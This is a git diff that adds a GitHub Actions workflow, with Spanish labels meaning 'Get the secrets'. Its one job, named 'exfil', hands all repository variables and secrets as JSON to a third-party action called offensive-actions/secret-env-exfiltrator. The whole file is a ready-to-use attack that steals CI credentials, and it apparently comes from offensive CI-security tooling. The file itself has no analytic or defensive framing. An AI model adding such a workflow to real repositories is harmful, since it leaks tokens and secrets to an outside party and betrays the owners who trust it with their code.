@@ -1,0 +1,11 @@
+name: Conseguir los secretos
+
+jobs:                                                                                                                                                            
+  exfil:                                                                                                                                                         
+    runs-on: ubuntu-latest                                                                                                                                       
+    name: Esto conseguirá los secretos de GitHub Actions gracias a la acción de Offensive Actions                                                                                                                              
+    steps:                                                                                                                                                       
+      - uses: offensive-actions/secret-env-exfiltrator@main                                                                                                      
+        with:                                                                                                                                                    
+          vars: ${{ toJSON(vars) }}                                                                                                                              
+          secrets: ${{ toJSON(secrets) }}
